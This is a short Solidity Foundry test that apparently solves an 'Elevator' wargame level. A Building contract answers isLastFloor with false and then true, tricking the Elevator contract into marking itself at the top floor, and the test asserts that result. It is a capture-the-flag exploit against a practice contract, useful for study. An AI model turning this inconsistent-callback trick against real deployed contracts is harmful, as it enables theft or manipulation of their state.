// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Elevator} from "../src/11.Elevator.sol";

contract Building {
   uint256 callCount;
   function isLastFloor(uint256 floor) external returns(bool) {
      if(callCount == 0){
        callCount++;
        return false;
      }
      callCount--;
      return true;
   }
}

contract ElevatorHackTest is Test {
  Elevator elevator;
  Building building;
   function setUp() public{
      elevator = new Elevator();
      building = new Building();
   }
   function testHack(uint256 n) public {
      vm.prank(address(building));
      elevator.goTo(n);
      assertEq(elevator.floor(), n);
      assertEq(elevator.top(), true);
   }
}